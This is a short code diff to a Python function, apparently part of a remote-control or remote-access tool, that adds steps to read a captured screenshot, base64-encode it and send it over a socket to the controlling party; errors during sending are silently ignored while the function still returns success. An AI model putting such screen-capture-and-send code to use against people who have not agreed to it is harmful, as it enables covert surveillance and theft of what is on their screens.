@@ -259,6 +259,27 @@ def take_screenshot(socket) -> bool:
                 socket_send(socket, f"[!] Screenshot capture failed: {str(e)}")
                 return False
 
+        # Read and send screenshot data
+        try:
+            with open(screenshot_file, "rb") as fp:
+                screenshot_data = fp.read()
+                fp.close()
+
+            if not screenshot_data:
+                socket_send(socket, "[!] Screenshot file is empty")
+                return False
+
+            # Encode and send the data
+            encoded_data = base64.b64encode(screenshot_data)
+            socket_send(socket, encoded_data)
+
+        except IOError as e:
+            pass
+        except Exception as e:
+            pass
+
+        return True
+
     except Exception as e:
         socket_send(socket, f"[!] Unexpected error during screenshot: {str(e)}")
         return False
